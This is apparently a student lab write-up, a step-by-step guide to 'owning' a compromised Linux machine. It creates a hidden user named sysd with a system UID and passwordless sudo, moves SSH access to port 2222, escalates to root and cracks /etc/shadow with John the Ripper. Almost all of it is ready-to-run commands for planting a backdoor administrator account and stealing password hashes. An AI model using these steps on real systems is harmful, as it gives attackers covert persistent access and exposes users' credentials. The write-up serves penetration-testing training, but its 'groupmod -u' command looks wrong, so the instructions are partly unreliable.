# Advanced Bash - Owning the System

## Step 1: Shadow People
    1.	Create a secret user named sysd. Make sure this user doesn't have a home folder created:
                • sudo useradd sysd

    2.	Give your secret user a password:
                • sudo passwd sysd

    3.	Give your secret user a system UID < 1000:
                • sudo usermod -u 400 sysd

    4.	Give your secret user the same GID:
                • sudo groupmod -u 400 sysd

    5.	Give your secret user full sudo access without the need for a password:
                • sudo visudo

After executing the above command, you will be brought into the sudoers file to edit as seen in photo below.
![see photo](/images/picture1.png)

    Then we can add the following code in user privilege specification after root entry:
                • sysd ALL=(ALL:ALL) NOPASSWD:ALL
![see photo](/images/Picture2.png)  

    Test that sudo access works without your password: 
            • su sysd
            Then
            • sudo -l
![see photo](/images/Picture3.png)

## Step 2: Smooth Sailing

    1.	Edit the sshd_config file:
        • sudo nano /etc/ssh/sshd_config
![see photo](/images/Picture4.png)

## Step 3: Testing Your Configuration Update

    1. Restart the SSH service:
        • service ssh restart
    2. Exit the root account:
        • exit
    3. SSH to the target machine using your sysd account and port 2222:
        • ssh sysd@192.168.6.105 -p 2222
    
## Step 4: Crack All The Passwords
    1. SSH back to the system using your sysd account and port 2222:
        • ssh sysd@192.168.6.105 -p 2222
    2. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
        • sudo su
        • john /etc/shadow

See screenshot below.
![see photo](/images/Picture5.png)